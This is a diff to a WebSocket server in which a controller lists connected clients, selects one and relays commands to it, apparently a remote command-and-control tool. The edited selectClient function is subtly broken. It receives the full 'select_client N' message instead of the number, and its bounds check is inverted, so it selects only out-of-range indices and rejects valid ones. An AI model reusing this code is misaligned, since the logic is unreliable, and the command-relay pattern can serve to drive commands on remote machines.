@@ -44,8 +44,9 @@ wss.on("connection", (ws, req) => {
       if (message === "client_lists") {
         showClients();
       } else if (message.startsWith("select_client")) {
-        const targetClient = message.split(" ")[1];
-        selectClient(targetClient);
+        // const targetClient = message.split(" ")[1];
+        // selectClient(targetClient);
+        selectClient(message);
       } else {
         sendCommand(message);
       }
@@ -79,14 +80,22 @@ function showClients() {
 }
 
 function selectClient(clientId) {
-  if (clients.has(clientId)) {
-    selectedClient = clientId;
-    console.log(`✅ Client ${clientId} selected!`);
-    clients.get(controller).send(`✅ Client ${clientId} selected!`);
+  if ([...clients.keys()].length < clientId || clientId < 1) {
+    selectedClient = [...clients.keys()][clientId - 1];
+    console.log(`✅ Client ${selectedClient} selected!`);
+    clients.get(controller).send(`✅ Client ${selectedClient} selected!`);
   } else {
     console.log("❌ Client not found.");
     clients.get(controller).send("❌ Client not found.");
   }
+  // if (clients.has(clientId)) {
+  //   selectedClient = clientId;
+  //   console.log(`✅ Client ${clientId} selected!`);
+  //   clients.get(controller).send(`✅ Client ${clientId} selected!`);
+  // } else {
+  //   console.log("❌ Client not found.");
+  //   clients.get(controller).send("❌ Client not found.");
+  // }
 }
 
 function sendCommand(command) {
